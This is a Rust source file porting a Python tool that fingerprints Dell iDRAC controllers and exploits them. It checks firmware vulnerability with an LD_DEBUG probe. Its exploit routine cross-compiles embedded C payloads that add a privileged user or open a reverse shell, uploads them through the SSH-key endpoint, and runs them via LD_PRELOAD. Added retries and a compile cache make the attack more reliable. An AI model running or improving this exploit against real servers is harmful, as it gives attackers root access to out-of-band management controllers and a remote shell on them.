//! Rust port of `libiDRAC/idrac.py`.
//!
//! One-to-one mapping of the Python class:
//!
//! | Python                     | Rust                              |
//! |----------------------------|-----------------------------------|
//! | `iDRAC.__init__`           | [`IDrac::new`]                    |
//! | `iDRAC._fetchURL`          | [`IDrac::fetch_url`] / [`IDrac::fetch_maybe`] |
//! | `iDRAC.getInfo`            | [`IDrac::get_info`]               |
//! | `iDRAC.checkIfVulnerable`  | [`IDrac::check_if_vulnerable`]    |
//! | `iDRAC.exploit`            | [`IDrac::exploit`]                |
//! | `iDRAC.getInventory`       | [`IDrac::get_inventory`]          |
//!
//! The Python result dicts become serde-friendly structs (`InfoResult`,
//! `VulnerabilityResult`, `ExploitResult`, `InventoryResult`) that serialize
//! with the same camelCase keys the Python dicts used (`systemModel`,
//! `fwVersion`, `rawLogs`, ...).

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use anyhow::{anyhow, bail, Context, Result};
use rand::{Rng, RngCore};
use reqwest::Client;
use serde::Serialize;
use serde_json::Value;
use tokio::process::Command;

use crate::compile_cache;
use crate::payloads;

// ---------------------------------------------------------------------------
// SSL context configuration
// ---------------------------------------------------------------------------

/// Transport knobs for the hardened client — tune these via
/// [`IDrac::with_options`]; `[IDrac::new]` uses `Options::default()`.
#[derive(Debug, Clone, Copy)]
pub struct Options {
    /// TCP + TLS full handshake upper bound (default 10s).
    pub connect_timeout: Duration,
    /// Whole-request (request → response) upper bound, matching python's
    /// httpx default `timeout` behavior (default 30s).
    pub request_timeout: Duration,
    /// Extra attempts after the first transport failure (default 2).
    /// Each retry waits ~250ms, 700ms, 1.3s ... (exponential backoff with
    /// ±25% jitter so concurrent runs don't stampede a flaky link).
    pub retries: u32,
}

impl Default for Options {
    fn default() -> Self {
        Self {
            connect_timeout: Duration::from_secs(10),
            request_timeout: Duration::from_secs(30),
            retries: 2,
        }
    }
}

/// 1:1 with the Python module-level `ssl_context`:
///
/// ```python
/// ssl_context.check_hostname = False
/// ssl_context.verify_mode = ssl.CERT_NONE
/// ssl_context.set_ciphers('ALL:@SECLEVEL=0')
/// ssl_context.minimum_version = ssl.TLSVersion.TLSv1
/// ```
///
/// iDRACs ship self-signed certificates and (older firmware) TLS 1.0, so the
/// client disables all verification and lowers the TLS floor. `SECLEVEL=0` is
/// not directly selectable through reqwest, but schannel/OpenSSL defaults
/// usually still negotiate old firmware.
///
/// Reliability extras on top of the python context: a separate connect
/// timeout (python had none — its TCP dial could block for minutes), plus
/// keep-alive pooling (`get_info` alone fires 2-4 requests at the same host,
/// and reusing one TLS connection saves a full handshake per request).
fn build_http_client(options: &Options) -> Result<Client> {
    Client::builder()
        .user_agent(concat!("libiDRAC-rs/", env!("CARGO_PKG_VERSION")))
        .tls_danger_accept_invalid_certs(true)
        .tls_danger_accept_invalid_hostnames(true)
        .tls_version_min(reqwest::tls::Version::TLS_1_0)
        .connect_timeout(options.connect_timeout)
        .timeout(options.request_timeout)
        .pool_idle_timeout(Duration::from_secs(90))
        .pool_max_idle_per_host(4)
        .tcp_nodelay(true)
        .build()
        .context("Failed to build HTTP client")
}

// ---------------------------------------------------------------------------
// Result structs (the Python dicts)
// ---------------------------------------------------------------------------

/// Return value of [`IDrac::get_info`]; mirrors the Python `result` dict.
#[derive(Debug, Clone, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InfoResult {
    pub ip: String,
    pub port: u16,
    pub hostname: Option<String>,
    pub system_model: Option<String>,
    pub idrac_model: Option<String>,
    pub license: Option<String>,
    pub fw_version: Option<String>,
    pub error: Option<String>,
    pub success: bool,
}

/// Return value of [`IDrac::check_if_vulnerable`].
#[derive(Debug, Clone, Default, Serialize)]
pub struct VulnerabilityResult {
    pub vulnerable: bool,
    pub error: Option<String>,
    pub success: bool,
}

/// Return value of [`IDrac::get_inventory`].
#[derive(Debug, Clone, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InventoryResult {
    pub success: bool,
    pub error: Option<String>,
    pub raw_logs: String,
}

/// `{username, password}` payload of [`ExploitResult::credentials`].
#[derive(Debug, Clone, Default, Serialize)]
pub struct ExploitCredentials {
    pub username: String,
    pub password: String,
}

/// The `reverse_shell` payload of [`ExploitResult`].
#[derive(Debug, Clone, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExploitReverseShell {
    pub ip: Option<String>,
    pub port: Option<u16>,
}

/// Return value of [`IDrac::exploit`].
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExploitResult {
    pub payload_type: String,
    pub credentials: ExploitCredentials,
    pub reverse_shell: Option<ExploitReverseShell>,
    pub privilege: String,
    pub success: bool,
    pub error: Option<String>,
}

/// Exploit kwargs bundle — mirrors the Python signature
/// `exploit(payload_type="adduser", username="root", password="calvin",
/// privilege="0x000001ff", reverse_ip=None, reverse_port=None)`.
#[derive(Debug, Clone, Copy)]
pub struct ExploitParams<'a> {
    pub payload_type: &'a str,
    pub username: &'a str,
    pub password: &'a str,
    pub privilege: &'a str,
    pub reverse_ip: Option<&'a str>,
    pub reverse_port: Option<u16>,
}

impl Default for ExploitParams<'_> {
    fn default() -> Self {
        Self {
            payload_type: "adduser",
            username: "root",
            password: "calvin",
            privilege: "0x000001ff",
            reverse_ip: None,
            reverse_port: None,
        }
    }
}

// ---------------------------------------------------------------------------
// The class
// ---------------------------------------------------------------------------

/// Port of the `iDRAC` class.
pub struct IDrac {
    ip: String,
    port: u16,
    username: Option<String>,
    password: Option<String>,
    base_url: String,
    client: Client,
    options: Options,
    // NOTE: the Python `payloadScripts` directory is replaced by payload
    // sources compiled into this crate (see `crate::payloads`), so there is no
    // runtime path to carry around.
}

const INVENTORY_COMMANDS: &[&str] = &[
    "racadm get BIOS.SysInformation",
    "racadm get BIOS.ProcSettings",
    "racadm get BIOS.MemSettings",
    "racadm get BIOS.SysProfileSettings",
    "racadm get BIOS.IntegratedDevices",
    "racadm get BIOS.SlotDisablement",
    "racadm get BIOS.SlotBifurcation",
    "racadm get BIOS.SataSettings",
    "racadm get BIOS.SysSecurity",
    "racadm get BIOS.TpmAdvanced",
    "racadm get BIOS.MiscSettings",
];

impl IDrac {
    /// `def __init__(self, ip, port = 443)`.
    ///
    /// The Python code lazily creates its `httpx.AsyncClient`; here the client
    /// is built eagerly so configuration errors surface immediately.
    pub fn new(ip: impl Into<String>, port: u16) -> Result<Self> {
        Self::with_options(ip, port, Options::default())
    }

    /// `new` with transport knobs (`new` keeps python-parity defaults).
    pub fn with_options(ip: impl Into<String>, port: u16, options: Options) -> Result<Self> {
        let ip = ip.into();
        Ok(Self {
            base_url: format!("https://{ip}:{port}"),
            client: build_http_client(&options)?,
            ip,
            port,
            username: None,
            password: None,
            options,
        })
    }

    /// Equivalent of setting `idrac.username` / `idrac.password` in Python.
    pub fn set_credentials(&mut self, username: impl Into<String>, password: impl Into<String>) -> &mut Self {
        self.username = Some(username.into());
        self.password = Some(password.into());
        self
    }

    pub fn ip(&self) -> &str {
        &self.ip
    }

    pub fn port(&self) -> u16 {
        self.port
    }

    pub fn base_url(&self) -> &str {
        &self.base_url
    }

    /// `async def _fetchURL(self, endpoint, data = None)` — GET when `data` is
    /// empty, POST with raw bytes otherwise.
    ///
    /// Differences from the python original (both deliberate hardening):
    /// * transport errors (connect / timeout / reset) are automatically
    ///   retried up to `Options::retries` times with jittered exponential
    ///   backoff — the python version died on the first flaky packet;
    /// * on requests that fail *after* `retries` attempts the error carries
    ///   the endpoint and the attempt count for fast diagnosis.
    ///
    /// The original raised httpx exceptions, even though several call sites
    /// branch on `rX is None` (clearly expecting a None-on-network-error
    /// semantic). This port implements that intent: [`IDrac::fetch_maybe`]
    /// collapses transport failures into `None`, so the ported branches behave
    /// the way the Python source intended.
    pub async fn fetch_url(&self, endpoint: &str, data: Vec<u8>) -> Result<reqwest::Response> {
        let url = format!("{}{}", self.base_url, endpoint);
        let attempts = (self.options.retries as usize).saturating_add(1).max(1);
        let mut last_err: Option<reqwest::Error> = None;
        for attempt in 0..attempts {
            if attempt > 0 {
                tokio::time::sleep(retry_backoff(attempt)).await;
            }
            // The body is cloned per attempt: a previous attempt may have
            // partially consumed the socket and `reqwest` body streams are
            // one-shot. Payload bodies are small, so this is negligible.
            let send = if data.is_empty() {
                self.client.get(&url).send().await
            } else {
                self.client.post(&url).body(data.clone()).send().await
            };
            match send {
                Ok(response) => return Ok(response),
                Err(e) => last_err = Some(e),
            }
        }
        let err = last_err.expect("at least one attempt always runs");
        Err(err).context(format!("request to {endpoint} failed after {attempts} attempt(s)"))
    }

    /// `fetch_url` with network errors collapsed to `None`.
    async fn fetch_maybe(&self, endpoint: &str, data: Vec<u8>) -> Option<reqwest::Response> {
        self.fetch_url(endpoint, data).await.ok()
    }

    /// `async def getInfo(self)` — fingerprint which iDRAC generation we are
    /// talking to and pull hostname / license / firmware details.
    pub async fn get_info(&self) -> Result<InfoResult> {
        let mut result = InfoResult {
            ip: self.ip.clone(),
            port: self.port,
            hostname: None,
            system_model: None,
            idrac_model: None,
            license: None,
            fw_version: None,
            error: None,
            success: true,
        };

        // ---- iDRAC6 probe ------------------------------------------------
        match self.fetch_maybe("/login.html", Vec::new()).await {
            Some(login) if login.status().as_u16() == 200 => {
                let text = login.text().await.unwrap_or_default();
                let text_lower = text.to_lowercase();
                if text_lower.contains("idrac6") && !text_lower.contains("idrac7") {
                    result.idrac_model = Some("iDRAC6".to_string());
                    for line in text.split('\n') {
                        let line_lower = line.to_lowercase();
                        if line_lower.contains("var tmphostname") {
                            // line.split('"')[1].strip()
                            result.hostname = line.split('"').nth(1).map(|s| s.trim().to_string());
                        } else if line_lower.contains("integrated dell remote access controller 6") {
                            // line.split('- ')[1].split('<')[0]
                            result.license = line
                                .split("- ")
                                .nth(1)
                                .and_then(|s| s.split('<').next())
                                .map(|s| s.to_string());
                        }
                    }
                    return Ok(result);
                }
                // 200 without an iDRAC6 marker: fall through to the 12G probe.
            }
            None => {
                result.success = false;
                result.error = Some("Timeout connecting to iDRAC".to_string());
                return Ok(result);
            }
            Some(_) => { /* non-200: fall through */ }
        }

        // ---- iDRAC7/8 probe ----------------------------------------------
        match self.fetch_maybe("/data?get=prodServerGen", Vec::new()).await {
            Some(resp) if resp.status().as_u16() == 200 => {
                let text = resp.text().await.unwrap_or_default();
                if text.to_lowercase().contains("12g") {
                    result.idrac_model = Some("iDRAC7".to_string());
                } else {
                    result.idrac_model = Some("iDRAC8".to_string());
                }

                // The two detail probes are independent — fire them
                // concurrently. (The python original paid two serial
                // round-trips on the same host; a piggybacked join! halves
                // that wall time.)
                let (r_class_name, r_session) = tokio::join!(
                    self.fetch_maybe("/data?get=prodClassName", Vec::new()),
                    self.fetch_maybe(
                        "/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc",
                        Vec::new(),
                    )
                );

                // <prodClassName>...</prodClassName> (python: try/except pass)
                if let Some(r_class_name) = r_class_name {
                    if r_class_name.status().as_u16() == 200 {
                        let text = r_class_name.text().await.unwrap_or_default();
                        result.license = xml_tag_field(&text, "prodClassName");
                    }
                }

                if let Some(r_session) = r_session {
                    if r_session.status().as_u16() == 200 {
                        let text = r_session.text().await.unwrap_or_default();
                        // python: try/except pass on JSON decode
                        if let Ok(data) = serde_json::from_str::<Value>(&text) {
                            if let Some(aim) = data.get("aimGetProp") {
                                result.hostname = aim_get_default(aim, "hostname");
                                result.fw_version = aim_get_default(aim, "fwVersion");
                                result.system_model = aim_get_default(aim, "sysDesc");
                            }
                        }
                    }
                }
                return Ok(result);
            }
            None => {
                result.success = false;
                result.error = Some("Timeout connecting to iDRAC".to_string());
                return Ok(result);
            }
            Some(_) => { /* non-200: fall through */ }
        }

        // ---- iDRAC9 probe -------------------------------------------------
        match self
            .fetch_maybe("/restgui/locale/strings/locale_str_en.json", Vec::new())
            .await
        {
            Some(resp) if resp.status().as_u16() == 200 => {
                let text = resp.text().await.unwrap_or_default();
                // python: try/except pass on JSON decode
                if let Ok(data) = serde_json::from_str::<Value>(&text) {
                    if data.get("app_title").and_then(Value::as_str) == Some("iDRAC9") {
                        result.idrac_model = Some("iDRAC9".to_string());
                    }
                }
            }
            None => {
                result.success = false;
                result.error = Some("Timeout connecting to iDRAC".to_string());
                return Ok(result);
            }
            Some(_) => { /* non-200: fall through */ }
        }

        Ok(result)
    }

    /// `async def checkIfVulnerable(self)` — firmware version probe plus the
    /// `LD_DEBUG=files` loader trace on the login CGI.
    pub async fn check_if_vulnerable(&self) -> Result<VulnerabilityResult> {
        let mut result = VulnerabilityResult {
            vulnerable: false,
            error: None,
            success: true,
        };

        // Firmware check (python wraps this block in try/except)
        let fw_vulnerable = match self.fetch_maybe("/session?aimGetProp=fwVersion", Vec::new()).await {
            Some(r_session) if r_session.status().as_u16() == 200 => {
                let text = r_session.text().await.unwrap_or_default();
                let fw_version = match extract_fw_version(&text) {
                    Ok(fw) => fw,
                    Err(e) => {
                        result.success = false;
                        result.error = Some(format!("{e:#}"));
                        return Ok(result);
                    }
                };
                match firmware_vulnerable(&fw_version) {
                    Ok(v) => v,
                    Err(e) => {
                        result.success = false;
                        result.error = Some(format!("{e:#}"));
                        return Ok(result);
                    }
                }
            }
            _ => false, // timeout or non-200: skip silently (python semantics)
        };

        // LD_DEBUG check
        let mut ld_debug_vulnerable = false;
        if fw_vulnerable {
            match self.fetch_maybe("/cgi-bin/login?LD_DEBUG=files", Vec::new()).await {
                Some(r_ld_debug) if r_ld_debug.status().as_u16() < 400 => {
                    let text = r_ld_debug.text().await.unwrap_or_default();
                    if !text.is_empty() && text.contains("calling init: /lib/") {
                        ld_debug_vulnerable = true;
                    }
                }
                _ => { /* timeout or bad status: python keeps it silently false */ }
            }
        }

        result.vulnerable = fw_vulnerable && ld_debug_vulnerable;
        Ok(result)
    }

    /// `async def exploit(...)` — validate the payload, render the embedded C
    /// source, cross-compile with `sh4-linux-gnu-gcc`, upload it through the
    /// raw SSH public-key endpoint and trigger the loader.
    ///
    /// Unlike Python there is no runtime file layout: `payloads/*.c` are
    /// embedded in the crate, so the "payload file not found" branch of the
    /// original can no longer occur. All Python print() lines are preserved.
    pub async fn exploit(&self, params: &ExploitParams<'_>) -> ExploitResult {
        let mut result = ExploitResult {
            payload_type: params.payload_type.to_string(),
            credentials: ExploitCredentials {
                username: params.username.to_string(),
                password: params.password.to_string(),
            },
            reverse_shell: Some(ExploitReverseShell {
                ip: params.reverse_ip.map(str::to_string),
                port: params.reverse_port,
            }),
            privilege: params.privilege.to_string(),
            success: true,
            error: None,
        };

        // Fail fast (before touching the filesystem or the network) on
        // parameter values that could not possibly work. Python spliced these
        // values straight into C source and only noticed at gcc time with a
        // confusing "Compilation failed" far from the root cause.
        if let Err(msg) = validate_exploit_params(params) {
            result.success = false;
            result.error = Some(msg);
            return result;
        }
        let source = payloads::source_for(params.payload_type)
            .expect("validate_exploit_params already checked the payload type");

        // work_<8 hex> work folder (python used str(uuid.uuid4())[:8])
        let mut raw = [0u8; 4];
        rand::rng().fill_bytes(&mut raw);
        let work_folder = format!("work_{}", hex::encode(raw));
        if let Err(e) = std::fs::create_dir_all(&work_folder) {
            result.success = false;
            result.error = Some(format!("{e}"));
            return result;
        }

        // python `finally: shutil.rmtree(workFolder)` — runs on every path.
        let _guard = WorkDirGuard { path: PathBuf::from(&work_folder) };

        // python: try: <exploit body> except Exception as e: -> error result
        if let Err(e) = self.run_exploit(params, source, Path::new(&work_folder), &mut result).await {
            println!("Error during exploit: {e:#}");
            result.success = false;
            result.error = Some(format!("{e:#}"));
        }

        result
    }

    /// The `try:` body of Python `exploit`. Dedicated failure branches (a
    /// python `result["error"] = ...; return` inside the try) mark `result`
    /// and return `Ok(())`; unexpected failures bubble up as `Err`.
    async fn run_exploit(
        &self,
        params: &ExploitParams<'_>,
        source: &str,
        work_dir: &Path,
        result: &mut ExploitResult,
    ) -> Result<()> {
        // Replace variables based on payload type (python .replace chain).
        // NOTE: python would fail on reverse_ip/reverse_port = None because
        // bytes.replaceAll expects str — the port substitutes "None" like the
        // str(None) f-string prints do later.
        let rendered = match params.payload_type {
            "reverseshell" => source
                .replace("{ip}", params.reverse_ip.unwrap_or("None"))
                .replace("{port}", &params.reverse_port.map(|p| p.to_string()).unwrap_or_else(|| "None".to_string())),
            _ => source
                .replace("{username}", params.username)
                .replace("{password}", params.password)
                .replace("{privilege}", params.privilege),
        };

        let payload_c_path = work_dir.join("payload.c");
        tokio::fs::write(&payload_c_path, &rendered)
            .await
            .with_context(|| format!("Failed to write {}", payload_c_path.display()))?;

        // Compile — now with a hard deadline (a wedged cross-compiler used to
        // hang an exploit run forever) and a content-addressed cache
        // (identical rendered sources skip `sh4-linux-gnu-gcc` entirely,
        // which is the slowest step of every run).
        println!("Compiling {} payload...", params.payload_type);
        let payload_so_path = work_dir.join("payload.so");

        let payload_so: Vec<u8> = if let Some(cached) = compile_cache::lookup(&rendered) {
            println!("Compilation successful (cache hit)");
            cached
        } else {
            let mut gcc = Command::new("sh4-linux-gnu-gcc");
            gcc.args(["-shared", "-fPIC"])
                .arg(&payload_c_path)
                .arg("-o")
                .arg(&payload_so_path)
                // gcc never needs stdin; isolate it so a confused toolchain
                // can't block on an inherited (open) console handle.
                .stdin(Stdio::null())
                // On an overdue compile the future is dropped mid-wait and
                // `kill_on_drop` tears the compiler process down with it.
                .kill_on_drop(true);

            let outcome = match tokio::time::timeout(COMPILE_TIMEOUT, gcc.output()).await {
                Ok(Ok(output)) if output.status.success() => Ok(()),
                Ok(Ok(output)) => Err(gcc_diagnostics(&output)),
                Ok(Err(e)) if e.kind() == std::io::ErrorKind::NotFound => Err(
                    "(SH4 cross-compiler required, sh4-linux-gnu-gcc not found in PATH)".to_string(),
                ),
                Ok(Err(e)) => Err(format!("failed to run cross-compiler: {e}")),
                Err(_) => Err(format!(
                    "cross-compiler exceeded {}s wall clock and was killed",
                    COMPILE_TIMEOUT.as_secs()
                )),
            };

            if let Err(detail) = outcome {
                println!("Compilation failed");
                result.success = false;
                result.error = Some(format!("Compilation failed {detail}"));
                return Ok(());
            }
            println!("Compilation successful");

            match tokio::fs::read(&payload_so_path).await {
                Ok(bytes) => {
                    compile_cache::store(&rendered, &bytes);
                    bytes
                }
                Err(e) => {
                    result.success = false;
                    result.error = Some(format!("Failed to read {}: {e}", payload_so_path.display()));
                    return Ok(());
                }
            }
        };

        println!("Uploading payload...");

        // Upload framing, byte for byte with python (see `build_upload_frame`).
        let upload = build_upload_frame(&payload_so);

        let upload_response = self.fetch_maybe("/cgi-bin/putfile", upload).await;
        match upload_response {
            Some(resp) if resp.status().as_u16() == 200 => {
                println!("Payload uploaded successfully");
            }
            _ => {
                println!("Payload upload failed");
                result.success = false;
                result.error = Some("Error uploading payload, maybe a timeout issue.".to_string());
                return Ok(());
            }
        }

        // Trigger payload
        println!("Triggering payload...");
        let trigger_response = self
            .fetch_maybe("/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp", Vec::new())
            .await;
        match trigger_response {
            Some(resp) if resp.status().as_u16() == 200 => {
                println!("Payload triggered successfully");
                if params.payload_type == "adduser" {
                    println!("✓ User added successfully");
                    println!("  Username: {}", params.username);
                    println!("  Password: {}", params.password);
                } else if params.payload_type == "reverseshell" {
                    println!("✓ Reverse shell payload executed");
                    // python f-strings print str(None) when the params are missing
                    let ip_str = params.reverse_ip.unwrap_or("None");
                    let port_str = params
                        .reverse_port
                        .map(|p| p.to_string())
                        .unwrap_or_else(|| "None".to_string());
                    println!("  Connecting to {ip_str}:{port_str}");
                    println!("  Make sure you have a listener ready!");
                }
            }
            _ => {
                println!("Payload trigger failed");
                result.success = false;
                result.error = Some("Error triggering the payload, maybe a timeout issue.".to_string());
                return Ok(());
            }
        }

        Ok(())
    }

    /// `async def getInventory(self, username=None, password=None)` — SSH in
    /// (host key auto-accepted, like paramiko's AutoAddPolicy), run a fixed
    /// `racadm get` command list in an interactive shell and return the raw
    /// session transcript. All ssh2/i/o failures are converted into
    /// `error: "SSH error: ..."` exactly like the python except block.
    pub async fn get_inventory(&self, username: Option<&str>, password: Option<&str>) -> InventoryResult {
        let username = username.map(str::to_string).or_else(|| self.username.clone());
        let password = password.map(str::to_string).or_else(|| self.password.clone());
        let ip = self.ip.clone();

        // paramiko is synchronous; keep the tokio workers free. A wall clock
        // wraps the whole session so a wedged iDRAC can no longer hang the
        // caller forever (the detached blocking thread cleans itself up once
        // its socket timeouts fire).
        let fut = tokio::task::spawn_blocking(move || ssh_inventory(&ip, username, password));
        match tokio::time::timeout(SSH_WALL_CLOCK, fut).await {
            Ok(Ok(result)) => result,
            Ok(Err(e)) => {
                println!("Error: {e}");
                println!("SSH connection closed");
                InventoryResult {
                    success: false,
                    error: Some(format!("SSH error: {e}")),
                    raw_logs: String::new(),
                }
            }
            Err(_) => {
                let msg = format!(
                    "SSH error: inventory exceeded {}s wall clock and was abandoned",
                    SSH_WALL_CLOCK.as_secs()
                );
                println!("Error: {msg}");
                println!("SSH connection closed");
                InventoryResult {
                    success: false,
                    error: Some(msg),
                    raw_logs: String::new(),
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Exploit plumbing
// ---------------------------------------------------------------------------

/// Mirrors the python `finally: shutil.rmtree(workFolder)` block.
struct WorkDirGuard {
    path: PathBuf,
}

impl Drop for WorkDirGuard {
    fn drop(&mut self) {
        match std::fs::remove_dir_all(&self.path) {
            Ok(()) => println!("Cleaned up work folder: {}", self.path.display()),
            Err(e) => println!(
                "Warning: Could not clean up work folder {}: {e}",
                self.path.display()
            ),
        }
    }
}

// ---------------------------------------------------------------------------
// Hardening helpers (the speed + reliability layer)
// ---------------------------------------------------------------------------

/// Hard deadline for a gcc invocation — the cross-compiler is an external
/// process and a wedged toolchain used to hang an exploit run forever.
const COMPILE_TIMEOUT: Duration = Duration::from_secs(90);

/// Hard wall clock for an entire SSH inventory session.
const SSH_WALL_CLOCK: Duration = Duration::from_secs(150);

/// Upload framing, byte for byte with python:
///
/// ```python
/// payload = FAlias + (32 - len(FAlias))*b'\0'
///         + struct.pack('<L', len(payload_so))
///         + struct.pack('<L', FFLAGS=1)
///         + payload_so
/// ```
fn build_upload_frame(payload_so: &[u8]) -> Vec<u8> {
    let f_alias: &[u8] = b"RACPKSSHAUTHKEY1";
    let mut upload = Vec::with_capacity(32 + 8 + payload_so.len());
    upload.extend_from_slice(f_alias);
    upload.resize(32, 0);
    upload.extend_from_slice(&(payload_so.len() as u32).to_le_bytes());
    upload.extend_from_slice(&1u32.to_le_bytes());
    upload.extend_from_slice(payload_so);
    upload
}

/// Pre-flight validation for [`ExploitParams`] (fail fast, before the work
/// folder is created or anything hits the network). Rules:
///
/// * `payload_type` must name a registered payload (same message as python);
/// * `username`/`password` (adduser payloads) must be non-empty and must not
///   contain characters that break or corrupt the C string literal they are
///   spliced into (`"`, `\`, newlines, NUL);
/// * `privilege` must parse as a hex (`0x...`) or decimal integer — python
///   only noticed a bad value when gcc failed to compile the render;
/// * `reverseshell` requires a reverse target up front.
pub fn validate_exploit_params(params: &ExploitParams<'_>) -> std::result::Result<(), String> {
    if payloads::source_for(params.payload_type).is_none() {
        let available = payloads::names();
        return Err(format!(
            "Invalid payload type. Available types: [{}]",
            available.join(", ")
        ));
    }
    match params.payload_type {
        "reverseshell" => {
            let ip = params.reverse_ip.unwrap_or("");
            if ip.is_empty() {
                return Err("reverseshell payload requires --reverse-ip".to_string());
            }
            check_c_literal(ip, "reverse-ip")?;
            if params.reverse_port.is_none() {
                return Err("reverseshell payload requires --reverse-port".to_string());
            }
        }
        _ => {
            for (value, what) in [(params.username, "username"), (params.password, "password")] {
                check_c_literal(value, what)?;
                if value.is_empty() {
                    return Err(format!("{what} must not be empty"));
                }
            }
            if let Err(e) = validate_privilege(params.privilege) {
                return Err(format!("invalid privilege '{}': {e}", params.privilege));
            }
        }
    }
    Ok(())
}

/// Values are spliced verbatim into C string literals; reject anything that
/// would break (or silently corrupt) compilation at *render* time instead of
/// discovering it later as a cryptic gcc error.
fn check_c_literal(value: &str, what: &str) -> std::result::Result<(), String> {
    let mut it = value.char_indices();
    loop {
        let Some((offset, ch)) = it.next() else {
            return Ok(());
        };
        if matches!(ch, '"' | '\\' | '\n' | '\r' | '\0') {
            return Err(format!(
                "{what} contains an unallowable character ('{ch}') at byte offset {offset}: quotes, backslashes and control characters would break the generated C source"
            ));
        }
    }
}

/// `privilege` may be `0x000001ff` / `0X000001ff` / plain decimal.
fn validate_privilege(s: &str) -> std::result::Result<u64, String> {
    let trimmed = s.trim();
    let parsed = if let Some(hex_part) = trimmed.strip_prefix("0x").or(trimmed.strip_prefix("0X")) {
        u64::from_str_radix(hex_part, 16)
    } else {
        trimmed.parse::<u64>()
    };
    parsed.map_err(|_| "must be a hex ('0x000001ff') or decimal integer".to_string())
}

/// Backoff schedule in ms: 250, 500, 1000, 2000, 2000, ... (exponential,
/// capped so a long outage can't stretch a request chain into minutes).
fn retry_backoff_ms(attempt: usize) -> u64 {
    let shift = attempt.saturating_sub(1).min(3);
    250u64.saturating_mul(1u64 << shift).min(2000)
}

/// Wrap the schedule in a ±25% random factor: N hosts retrying in lockstep on
/// one flaky link must not stampede the socket back open together.
fn retry_backoff(attempt: usize) -> Duration {
    let factor = rand::rng().random_range(0.75..=1.25f64);
    Duration::from_millis((retry_backoff_ms(attempt) as f64 * factor) as u64)
}

/// The most actionable line of gcc's stderr (a real `error:` line if
/// present, else the first non-blank line) so the result says *why* the
/// compile broke instead of just that it broke.
fn gcc_diagnostics(output: &std::process::Output) -> String {
    let stderr = String::from_utf8_lossy(&output.stderr);
    let lines: Vec<&str> = stderr.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
    match lines.iter().find(|l| l.contains("error")).or(lines.first()) {
        Some(line) => (*line).to_string(),
        None => format!("no compiler diagnostics ({})", output.status),
    }
}

// ---------------------------------------------------------------------------
// SSH inventory plumbing (paramiko port, libssh2 under the hood)
// ---------------------------------------------------------------------------

/// Blocking port of the python getInventory SSH session.
fn ssh_inventory(ip: &str, username: Option<String>, password: Option<String>) -> InventoryResult {
    let mut result = InventoryResult {
        success: false,
        error: None,
        raw_logs: String::new(),
    };

    // python: username = self.username if username is None else username
    // (paramiko then raises TypeError for None — surfaced as an SSH error)
    let (Some(username), Some(password)) = (username.as_deref(), password.as_deref()) else {
        result.error = Some("SSH error: username/password not provided".to_string());
        println!("Error: {}", result.error.clone().unwrap_or_default());
        println!("SSH connection closed");
        return result;
    };

    println!("SSH connecting to {ip}...");

    // -- connect (paramiko timeout=30 applies to the TCP connect) ----------
    // One bounded retry covers a single dropped SYN / stale ARP entry on
    // congested lab networks; the python version died on the first attempt.
    let tcp = match connect_with_retry(ip, 22, Duration::from_secs(30), 2, Duration::from_millis(400)) {
        Ok(t) => t,
        Err(e) => return fail_ssh(result, e),
    };
    // Bound libssh2's blocking reads/writes on the socket itself: without
    // this a half-open connection could wedge the handshake (and the OS
    // thread) forever. 30s matches the python session timeout.
    let _ = tcp.set_nodelay(true);
    let _ = tcp.set_read_timeout(Some(Duration::from_secs(30)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(30)));

    // -- handshake (AutoAddPolicy == accept whatever key the host offers) ---
    let mut sess = match ssh2::Session::new() {
        Ok(s) => s,
        Err(e) => return fail_ssh(result, e),
    };
    sess.set_tcp_stream(tcp);
    if let Err(e) = sess.handshake() {
        return fail_ssh(result, e);
    }
    sess.set_timeout(30_000);

    // -- auth: password only (paramiko allow_agent=False, look_for_keys=False)
    if let Err(e) = sess.userauth_password(username, password) {
        return fail_ssh(result, e);
    }

    // -- shell (invoke_shell opens a vt100 80x24 PTY by default) -----------
    let mut channel = match sess.channel_session() {
        Ok(c) => c,
        Err(e) => return fail_ssh(result, e),
    };
    if let Err(e) = channel.request_pty("vt100", None, Some((80, 24, 0, 0))) {
        return fail_ssh(result, e);
    }
    if let Err(e) = channel.shell() {
        return fail_ssh(result, e);
    }
    // Wait for the banner/prompt and discard it. The python code slept a
    // fixed 3s and then drained blindly; here we stop as soon as the stream
    // goes quiet — usually ~10x faster on healthy iDRACs, while still
    // bounded at 5s to tolerate a slow shell bring-up.
    wait_until_quiet(&mut channel, Duration::from_secs(5), Duration::from_millis(700));

    // Execute all commands
    let mut all_output = String::new();
    for cmd in INVENTORY_COMMANDS {
        println!("Executing: {cmd}");
        if let Err(e) = channel
            .write_all(format!("{cmd}\n").as_bytes())
            .and_then(|()| channel.flush())
        {
            return fail_ssh(result, e);
        }
        std::thread::sleep(Duration::from_millis(250));
    }

    // Wait for all commands to finish (idle timeout = 10s, 500ms poll)
    println!("Waiting for commands to complete...");
    let idle_timeout = Duration::from_secs(10);
    let hard_deadline = Instant::now() + Duration::from_secs(120);
    let mut last_data_time = Instant::now();
    loop {
        match recv_ready_drain(&mut channel, 4096, &mut all_output) {
            Some(n) if n > 0 => {
                last_data_time = Instant::now();
                println!("Received {n} bytes");
            }
            Some(_) => break, // EOF on the stream
            None => {
                // shell.exit_status_ready()
                if channel.eof() {
                    break;
                }
            }
        }

        if last_data_time.elapsed() > idle_timeout {
            println!("No data for 10 seconds, assuming completion");
            break;
        }
        if Instant::now() >= hard_deadline {
            println!("Inventory transcript reached its 120s cap, stopping");
            break;
        }

        std::thread::sleep(Duration::from_millis(500));
    }

    // Get any remaining output
    let _ = recv_ready_drain(&mut channel, 4096, &mut all_output);

    result.raw_logs = all_output;
    result.success = true;

    // python finally: client.close()
    let _ = channel.send_eof();
    let _ = channel.close();
    let _ = channel.wait_close();
    let _ = sess.disconnect(None, "bye", None);
    println!("SSH connection closed");

    result
}

